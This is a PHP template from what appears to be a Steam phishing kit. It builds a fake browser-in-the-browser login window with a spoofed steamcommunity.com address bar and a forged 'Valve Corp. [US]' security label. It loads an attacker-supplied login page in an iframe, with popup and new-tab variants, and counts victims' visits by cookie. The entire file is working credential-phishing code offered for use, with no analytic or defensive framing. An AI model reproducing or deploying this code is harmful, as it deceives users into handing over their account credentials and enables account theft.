<?php
	if (!isset($_COOKIE["visited"])) { 
		$Fake->void_IncrementVisits(); 
		setcookie("visited", true, 1893445200); // 01.01.2030 00:00:00 
	}
	
	$title = $Fake->s_GetFakeTitle();
	
	$tempArr = explode(".", $title);
	$domain_name = $tempArr[0];
	$domain_zone = $tempArr[1];

	$login_link = $Fake->s_GetLoginLink() . "&ref=" . $ref;
	
	$head = "";
	
	$fake_window = '
				<div class="ui-widget-content ui-draggable ui-draggable-handle" id="new-window" style="width: 1024.5px; height: 573.3px;  left: 145px; top: 25px;"> <!-- display: none; -->
			<div class="window-header">
				<div class="window-header-logo"></div>
				<div class="window-header-label">
					Steam Community - <span id="browser-name">Google Chrome</span>
				</div>
				 <div class="steam_window_nav_btns">
				
 <div class="steam_window_nav_btn steam_window_nav_btn_hide window-header-close"></div> 
                <div class="steam_window_nav_btn steam_window_nav_btn_toggle window-header-close"></div> 
				<div class="steam_window_nav_btn steam_window_nav_btn_close flaticon-cancel window-header-close steam_window_nav_btn_close"></div>

            </div>
			</div>
			<div class="window-body">
				<div class="window-body-addressbar">
					<div class="addressbar-secure"><i class="flaticon--custom-2 flaticon-lock"></i><span class="addressbar-secure-label">Valve Corp. [US]</span></div>
					<input class="addressbar-address" disabled type="text" value="https://steamcommunity.com/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=https%3A%2F%2F%2F%3Floc%3Dlogin_migrate%26content_only%3D1%26openid_nonce%3DgO5aW7Br0kAECosz&amp;openid.realm=https%3A%2F%2F&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select">
				</div>
				<iframe class="window-body-data-1" src="' . $login_link . '"></iframe>
			</div>
		</div>
	';
	$browser_window = '
		<script>
			function loginReady() {
				document.win.close();
			}
			function login() {
				document.win = window.open("", "_blank", "status=no,toolbar=no,location=no,directories=no,resisable=no,srollbars=yes,width=1000,height=800");
				var content = "<style>body {margin: 0; overflow: hidden;} iframe {height: 100%; width: 100%; border: 0;}</style>";
				content += "<title>Steam Community</title>";
				content += "<iframe src=\'' . $login_link . '\'></iframe>";
				document.win.document.write(content);
			}
		</script>
	';
	
	$new_tab = '
		<script type="text/javascript">
			function loginReady() {
				document.win.close();
			}
			function login() {
				document.win = window.open("' . $login_link . '");
			}
		</script>
	';
	
	$login = "";
	$wnd_type = $Fake->int_GetWndType();
	
	switch ($wnd_type) {
		case 1: $login = $fake_window; break;
		case 2: $login = $browser_window; break;
		case 3: $login = $new_tab; break;
	}
?>